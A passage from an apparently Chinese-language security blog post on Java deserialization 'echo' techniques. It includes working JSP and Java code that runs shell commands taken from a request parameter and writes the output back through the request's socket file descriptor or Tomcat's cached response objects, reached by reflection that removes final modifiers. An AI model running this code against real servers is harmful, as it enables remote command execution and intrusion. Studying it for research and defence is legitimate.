class="keyword">new</span> java.io.InputStreamReader(Runtime.getRuntime().exec(cmd).getInputStream()));</span><br><span class="line">        java.util.List res1 = <span class="keyword">new</span> java.util.ArrayList();</span><br><span class="line">        String line = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">while</span> ((line = br.readLine()) != <span class="keyword">null</span> &amp;&amp; !line.trim().isEmpty())&#123;</span><br><span class="line">            res1.add(line);  <span class="comment">//将所有的Inode添加到一个列表中</span></span><br><span class="line">        &#125;</span><br><span class="line">        br.close();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Thread.sleep((<span class="keyword">long</span>)<span class="number">2000</span>); <span class="comment">//延时2秒</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            <span class="comment">//pass</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        command  = <span class="string">"ls -al /proc/$PPID/fd|grep socket:|awk '&#123;print $9, $11&#125;'"</span>; <span class="comment">//获取延时2秒后的Inode和fd属性，理论上来讲应该和第一次获取的Inode不一样，但是无论是第一次获取的Inode还是延迟后获取的Inode都会包含我们本次请求的socket对应的Inode</span></span><br><span class="line">        cmd = <span class="keyword">new</span> String[]&#123;<span class="string">"/bin/sh"</span>, <span class="string">"-c"</span>, command&#125;;</span><br><span class="line">        br = <span class="keyword">new</span> java.io.BufferedReader(<span class="keyword">new</span> java.io.InputStreamReader(Runtime.getRuntime().exec(cmd).getInputStream()));</span><br><span class="line">        java.util.List res2 = <span class="keyword">new</span> java.util.ArrayList();</span><br><span class="line">        <span class="keyword">while</span> ((line = br.readLine()) != <span class="keyword">null</span> &amp;&amp; !line.trim().isEmpty())&#123;</span><br><span class="line">            res2.add(line);  <span class="comment">//获取延迟2秒后的socket的Inode</span></span><br><span class="line">        &#125;</span><br><span class="line">        br.close();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> index = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> max = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; res2.size(); i++)&#123;</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                String socketNo = ((String)res2.get(i)).split(<span class="string">"\\s+"</span>)[<span class="number">1</span>].substring(<span class="number">8</span>); <span class="comment">//从res2中得到Inode</span></span><br><span class="line">                socketNo = socketNo.substring(<span class="number">0</span>, socketNo.length() - <span class="number">1</span>);</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; res1.size(); j++)&#123; </span><br><span class="line">                    <span class="keyword">if</span>(!socketNo.equals(res1.get(j))) <span class="keyword">continue</span>; <span class="comment">//判断延迟后的Inode是否在第一次请求的Inode中，如果不在则说明是新建立的socket，如果在则有可能是我们本次请求的socket。</span></span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span>(Integer.parseInt(socketNo) &gt; max) &#123; <span class="comment">//判断获取的Inode是否是最大的，如果是最大的，也就代表最新的一个socket，则有可能是我们请求的socket。</span></span><br><span class="line">                        max = Integer.parseInt(socketNo);</span><br><span class="line">                        index = j;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">                <span class="comment">//pass</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> fd = Integer.parseInt(((String)res2.get(index)).split(<span class="string">"\\s"</span>)[<span class="number">0</span>]); <span class="comment">//获取到Inode最大的文件描述符fd的值。</span></span><br><span class="line">        java.lang.reflect.Constructor c= java.io.FileDescriptor.class.getDeclaredConstructor(new Class[]&#123;Integer.TYPE&#125;);//获取FileDescriptor的构造器</span><br><span class="line">        c.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        cmd = <span class="keyword">new</span> String[]&#123;<span class="string">"/bin/sh"</span>, <span class="string">"-c"</span>, <span class="string">"id"</span>&#125;;</span><br><span class="line">        String res = <span class="keyword">new</span> java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(<span class="string">"\\A"</span>).next(); <span class="comment">//执行我们想要执行的命令</span></span><br><span class="line">        String result = <span class="string">"HTTP/1.1 200 OK\nConnection: close\nContent-Length: "</span> + res.length() + <span class="string">"\n\n"</span> + res + <span class="string">"\n"</span>;</span><br><span class="line">        java.io.FileOutputStream os = <span class="keyword">new</span> java.io.FileOutputStream((java.io.FileDescriptor)c.newInstance(<span class="keyword">new</span> Object[]&#123;<span class="keyword">new</span> Integer(fd)&#125;)); <span class="comment">//获取通过fd获取socket的FileOutputStream输出流</span></span><br><span class="line">        os.write(result.getBytes()); <span class="comment">// 将命令执行的结果进行写入</span></span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<p>​        通过这种方式可以增加找到我们本次socket请求的概率，但是也不能保证写入的一定是我们本次请求的socket。如果写入的不是我们本次请求的socket，则可能会导致异常。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201222163940568.png" alt="image-20201222163940568"></p>
<h3 id="Tomcat回显"><a href="#Tomcat回显" class="headerlink" title="Tomcat回显"></a>Tomcat回显</h3><h4 id="lastServicedResponse获取response对象"><a href="#lastServicedResponse获取response对象" class="headerlink" title="lastServicedResponse获取response对象"></a>lastServicedResponse获取response对象</h4><p>​        之前我们了解了windows和Linux的回显方法，这些方法的基本思路是找到我们请求的那条数据的socket的文件描述符，向请求的响应中写入命令执行的结果，那么我们能不能在http层面去获取到当前HTTP请求的响应，并在响应中写入我们的回显。在java web中存在HttpServletResponse和HttpServletResponse对象，通过这两个对象我们可以对请求和响应进行处理，比如我们可以通过<code>response.getWriter().write()</code>将响应内容发送到缓冲区，并刷新缓冲区发送回显，测试代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">index</span><span class="params">(String input, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    String xxx=<span class="string">"test666"</span>;</span><br><span class="line">    Writer writer = response.getWriter();</span><br><span class="line">    writer.write(xxx);</span><br><span class="line">    writer.flush();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201222174453051.png" alt="image-20201222174453051"></p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201222174459580.png" alt="image-20201222174459580"></p>
<p>​        这个是我们直接修改源代码实现的结果，在实际使用过程中我们可能是需要通过反射来执行命令的，<strong>我们如何才能通过反射调用获取本次请求的response对象？</strong></p>
<p>​        一般来说，HttpServletResponse实例化的对象已经被加载到内存中，我们无法通过反射调用来获取这个对象中的内容，所以比较好的方法是去寻找HttpServletResponse对象在哪里被存储过，再通过反射调用获取存储HttpServletResponse的变量的值，再调用write将命令执行的结果写入返回内容。</p>
<p>​        参考先知上<code>Tomcat中一种半通用回显方法</code>,作者发现了ApplicationFilterChain的lastServicedResponse记录了response的内容。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201222181211815.png" alt="image-20201222181211815"></p>
<p>​        因此我们可以通过调用getLastServicedResponse来获取ServletResponse对象。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201222181321356.png" alt="image-20201222181321356"></p>
<p>​        我们还需要确定response的对象在整个传输链中代表的是否是一个对象，我将执行到index是的response对象和ApplicationFilterChain中的response对象做一个对比，发现是一个对象，所以我们在ApplicationFilterChain获取的response</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201222181748658.png" alt="image-20201222181748658"></p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201222181935267.png" alt="image-20201222181935267"></p>
<p>​        而且lastServicedResponse是static final修饰的，也就是说这个属性一旦赋值后就不能更改。并且还通过ThreadLocal进行修饰，这代表这个属性只能在当前线程中进行调用。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201222183335083.png" alt="image-20201222183335083"></p>
<p>​        但是想要执行到赋值操作，需要ApplicationDispatcher.WRAP_SAME_OBJECT的属性为true，但是这个属性默认为false,也就是说默认不会执行这个赋值语句。所以我们需要通过反射来获取ApplicationDispatcher.WRAP_SAME_OBJECT属性，并对这个属性的值进行更改。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201222191217452.png" alt="image-20201222191217452"></p>
<p>​        通过上面的分析，要通过这种思路完成tomcat下的回显 ，需要如下步骤</p>
<ul>
<li><p>通过反射获取WRAP_SAME_OBJECT_FIELD，并将这个值设置为true</p>
</li>
<li><p>通过反射获取lastServicedRequest和lastServicedResponse属性，从lastServicedRequest获取当前的request对象，通过request对象获取请求参数。通过lastServicedResponse获取response对象，并获取到response的write方法。</p>
</li>
<li><p>执行命令并将命令执行的结果写入到response中。</p>
<p>由于我们需要修改的属性lastServicedRequest和lastServicedResponse都是final static修饰的变量，因此，我们得了解如何通过反射来设置final static修饰的变量。</p>
<p>​        我写了一个小Demo，代码如下：</p>
<p>test.java</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Final.Static;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String test666 = <span class="keyword">null</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">getTest666</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> test666;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>GetTest.java</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Final.Static;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Modifier;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GetTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException </span>&#123;</span><br><span class="line">        Field test666=test.class.getDeclaredField("test666");</span><br><span class="line">        test666.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        String test=(String)test666.get(<span class="keyword">null</span>);</span><br><span class="line">        test666.set(<span class="keyword">null</span>,<span class="string">"xxx"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​        运行上面的代码，会返回如下报错，也就是说无法通过set方法给由final修饰的属性赋值，因为一般final代表的是一个常量，一般不允许我们去修改常量的值。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201223092542124.png" alt="image-20201223092542124"></p>
<p>​        在Filed类中，可以通过getModifiers方法获取Filed的modifiers属性。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201223092911018.png" alt="image-20201223092911018"></p>
<p>​    这个属性的值代表了用户的访问权限</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//0x00000001(十六进制) = 1(十进制)</span></span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> PUBLIC           = <span class="number">1</span>;</span><br><span class="line"> <span class="comment">//0x00000002(十六进制) = 2(十进制)</span></span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> PRIVATE          = <span class="number">2</span>;   </span><br><span class="line"> <span class="comment">//0x00000004(十六进制) = 4(十进制)</span></span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> PROTECTED        = <span class="number">4</span>;  </span><br><span class="line"> <span class="comment">//0x00000008(十六进制) = 8(十进制)</span></span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> STATIC           = <span class="number">8</span>;  </span><br><span class="line"> <span class="comment">//0x00000010(十六进制) = 16(十进制)</span></span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> FINAL            = <span class="number">16</span>;</span><br></pre></td></tr></table></figure>

<p>​        如果我们的修饰符是由<code>private static final</code>来修饰的,modifiers属性的值也就是26。所以我们如果要对final修饰的变量进行赋值，就要重新设置这个变量的modifiers属性。代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Final.Static;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Modifier;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GetTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException </span>&#123;</span><br><span class="line">        Field test666=test.class.getDeclaredField("test666");</span><br><span class="line">        Field  modifiersField = Field.class.getDeclaredField("modifiers");  //获取Field类的modifiers属性</span><br><span class="line">        modifiersField.setAccessible(<span class="keyword">true</span>);  <span class="comment">//设置属性的访问权限</span></span><br><span class="line">        modifiersField.setInt(test666, test666.getModifiers() &amp; ~Modifier.FINAL); <span class="comment">//重新设置test666变量的modifiers属性</span></span><br><span class="line">        test666.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        String test=(String)test666.get(<span class="keyword">null</span>);</span><br><span class="line">        test666.set(<span class="keyword">null</span>,<span class="string">"xxx"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​        运行该代码，我们可以看到，没有设置前test666变量的modifiers属性为26，设置后更改为10，也就是去掉了test666变量的final修饰符。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201223093651210.png" alt="image-20201223093651210"></p>
</li>
</ul>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201223093748773.png" alt="image-20201223093748773"></p>
<p>​        理解了这个知识点，我们来看一下使用tomcat回显的整体代码实现</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">Field WRAP_SAME_OBJECT_FIELD = Class.forName(<span class="string">"org.apache.catalina.core.ApplicationDispatcher"</span>).getDeclaredField(<span class="string">"WRAP_SAME_OBJECT"</span>);  <span class="comment">//获取ApplicationDispatcher类的WRAP_SAME_OBJECT属性。</span></span><br><span class="line">     Field lastServicedRequestField = ApplicationFilterChain.class.getDeclaredField("lastServicedRequest"); //获取ApplicationFilterChain的lastServicedRequest属性</span><br><span class="line">     Field lastServicedResponseField = ApplicationFilterChain.class.getDeclaredField("lastServicedResponse"); //获取ApplicationFilterChain的lastServicedResponse属性</span><br><span class="line">     Field  modifiersField = Field.class.getDeclaredField("modifiers"); //获取Field的modifiers属性</span><br><span class="line">     modifiersField.setAccessible(<span class="keyword">true</span>); <span class="comment">//这个属性是由private修饰的，所以需要设置访问权限</span></span><br><span class="line">     modifiersField.setInt(WRAP_SAME_OBJECT_FIELD, WRAP_SAME_OBJECT_FIELD.getModifiers() &amp; ~Modifier.FINAL); <span class="comment">//去掉WRAP_SAME_OBJECT_FIELD的final修饰</span></span><br><span class="line">     modifiersField.setInt(lastServicedRequestField, lastServicedRequestField.getModifiers() &amp; ~Modifier.FINAL);<span class="comment">//去掉lastServicedRequestField的final修饰</span></span><br><span class="line">     modifiersField.setInt(lastServicedResponseField, lastServicedResponseField.getModifiers() &amp; ~Modifier.FINAL);<span class="comment">//去掉lastServicedResponseField的final修饰</span></span><br><span class="line">     WRAP_SAME_OBJECT_FIELD.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">     lastServicedRequestField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">     lastServicedResponseField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">     ThreadLocal&lt;ServletResponse&gt; lastServicedResponse = (ThreadLocal&lt;ServletResponse&gt;) lastServicedResponseField.get(<span class="keyword">null</span>); <span class="comment">//静态变量是和对象无关的，因此可以通过传入null来获取这个变量的内容。</span></span><br><span class="line">     ThreadLocal&lt;ServletRequest&gt; lastServicedRequest = (ThreadLocal&lt;ServletRequest&gt;) lastServicedRequestField.get(<span class="keyword">null</span>);<span class="comment">//静态变量是和对象无关的，因此可以通过传入null来获取这个变量的内容。lastServicedRequest进行初始化</span></span><br><span class="line">     <span class="keyword">boolean</span> WRAP_SAME_OBJECT = WRAP_SAME_OBJECT_FIELD.getBoolean(<span class="keyword">null</span>); <span class="comment">//静态变量是和对象无关的，因此可以通过传入null来获取这个变量的内容。</span></span><br><span class="line">     String cmd = lastServicedRequest != <span class="keyword">null</span></span><br><span class="line">             ? lastServicedRequest.get().getParameter(<span class="string">"cmd"</span>)</span><br><span class="line">             : <span class="keyword">null</span>; <span class="comment">//判断lastServicedRequest中是否为NULL，如果为NULL说明还不能获取request中的内容。</span></span><br><span class="line">     <span class="keyword">if</span> (!WRAP_SAME_OBJECT || lastServicedResponse == <span class="keyword">null</span> || lastServicedRequest == <span class="keyword">null</span>) &#123; <span class="comment">//判断WRAP_SAME_OBJECT是否为True,lastServicedResponse和lastServicedRequest内容是否为空</span></span><br><span class="line">         lastServicedRequestField.set(<span class="keyword">null</span>, <span class="keyword">new</span> ThreadLocal&lt;&gt;()); <span class="comment">// 初始化lastServicedRequest</span></span><br><span class="line">         lastServicedResponseField.set(<span class="keyword">null</span>, <span class="keyword">new</span> ThreadLocal&lt;&gt;()); <span class="comment">//初始化lastServicedResponse</span></span><br><span class="line">         WRAP_SAME_OBJECT_FIELD.setBoolean(<span class="keyword">null</span>, <span class="keyword">true</span>); <span class="comment">//设置WRAP_SAME_OBJECT_FIELD属性为True</span></span><br><span class="line">     &#125; <span class="keyword">else</span> <span class="keyword">if</span> (cmd != <span class="keyword">null</span>) &#123;</span><br><span class="line">         ServletResponse responseFacade = lastServicedResponse.get();</span><br><span class="line">         java.io.Writer w = responseFacade.getWriter(); <span class="comment">//获取response.writer</span></span><br><span class="line"></span><br><span class="line">         <span class="keyword">boolean</span> isLinux = <span class="keyword">true</span>;</span><br><span class="line">         String osTyp = System.getProperty(<span class="string">"os.name"</span>);</span><br><span class="line">         <span class="keyword">if</span> (osTyp != <span class="keyword">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">"win"</span>)) &#123;</span><br><span class="line">             isLinux = <span class="keyword">false</span>;</span><br><span class="line">         &#125;</span><br><span class="line">         String[] cmds = isLinux ? <span class="keyword">new</span> String[]&#123;<span class="string">"sh"</span>, <span class="string">"-c"</span>, cmd&#125; : <span class="keyword">new</span> String[]&#123;<span class="string">"cmd.exe"</span>, <span class="string">"/c"</span>, cmd&#125;;</span><br><span class="line">         InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">         Scanner s = <span class="keyword">new</span> Scanner(in).useDelimiter(<span class="string">"\\a"</span>);</span><br><span class="line">         String output = s.hasNext() ? s.next() : <span class="string">""</span>;</span><br><span class="line">         w.write(output);  <span class="comment">//写入命令执行结果</span></span><br><span class="line">         w.flush();</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure>

<p>​        最后效果如下，由于第一次请求时WRAP_SAME_OBJECT_FIELD属性为false所以不会给lastServicedResponse赋值，因此在第一次访问时是无法获取命令执行结果的，后来再去请求，就可以正常执行命令了。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201223104155616.png" alt="image-20201223104155616"></p>
<h4 id="AbstractProcessor获取response对象"><a href="#AbstractProcessor获取response对象" class="headerlink" title="AbstractProcessor获取response对象"></a>AbstractProcessor获取response对象</h4><p>​        参考<code>基于全局储存的新思路 | Tomcat的一种通用回显方法研究</code>的文章，可以通过其他方法来寻找request和response对象被tomcat存储过的地方。经过寻找，发现AbstractProcessor中会存储request和response对象。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201223113516089.png" alt="image-20201223113516089"></p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201223113558202.png" alt="image-20201223113558202"></p>
<p>​        但是AbstractProcessor类的request和response不是由static修饰的，也就是说我们想要获取这两个属性，就需要获取到AbstractProcessor对象。在打断点调试的过程中，发现tomcat会去创建Http11Processor对象，而Http11Processor是AbstractProcessor的子类，所以我们只要获取到Http11Processor对象就可以了。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201223114132149.png" alt="image-20201223114132149"></p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201223114257847.png" alt="image-20201223114257847"></p>
<p>​        所以需要查看哪里存储了processor对象，我们可以看到当获取了processor对象后，调用了register方法，并且传入了processor对象。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201223134031429.png" alt="image-20201223134031429"></p>
<p>​        在register中，获取了RequestInfo，并调用了setGlobalProcessor，并传入了this.global。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201223134142611.png" alt="image-20201223134142611"></p>
<p>​        传入的this.global也就是ConnectionHandler的global,而这个global是RequestGroupInfo对象。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201223144452026.png" alt="image-20201223144452026"></p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201223144535512.png" alt="image-20201223144535512"></p>
<p>​        跟进setGlobalProcessor,调用了addRequestProcessor并传入了this也就是requestInfo对象</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201223134402832.png" alt="image-20201223134402832"></p>
<p>​        继续跟进，将RequestInfo添加到了this.processors中</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201223134438913.png" alt="image-20201223134438913"></p>
<p>​        也就是将请求的requestinfo信息保存在了ConnectionHandler的global中。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201223144922321.png" alt="image-20201223144922321"></p>
<p>​        所以我们现在也可以考虑先获取AbstractProtocol对象，经过查找发现CoyoteAdapter类调用了connector，而connector中包含了</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201223145840694.png" alt="image-20201223145840694"></p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201223145931811.png" alt="image-20201223145931811"></p>
<p>​        查看继承关系，可以发现ProtocolHandler为AbstractProtocol的接口。不同的请求协议的类型会调用不同的子类去进行处理。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201223151356955.png" alt="image-20201223151356955"></p>
<p>​        所以我们如果可以找到connector对象，也可以间接获取request。在tomcat.java中，会将connector存储到Service对象中，所以我们只要可以获取Service对象就可以了。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201223152222218.png" alt="image-20201223152222218"></p>
<p>​        StandardService可以通过applicationContext来获取，applicationContext可以通过Context获取到，Context可以通过webappClassLoaderBase来获取,在Tomcat中通过webappClassLoader来加载web应用的calss文件。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Tomcat的类加载器可以分为两部分，第一个是Tomcat自身所使用的类加载器，会加载jre的lib包及tomcat的lib包的类，遵循类加载的双亲委派机制；第二个是每个Web应用程序用的，每个web应用程序都有自己专用的WebappClassLoader，优先加载&#x2F;web-inf&#x2F;lib下的jar中的class文件，这样就隔离了每个web应用程序的影响，但是webappClassLoader没有遵循类加载的双亲委派机制，处理的方法就是在使用webappClassLoader的load加载类会进行过滤，如果有些类被过滤掉还是通过双亲委派机制优先从父加载器中加载类。</span><br></pre></td></tr></table></figure>

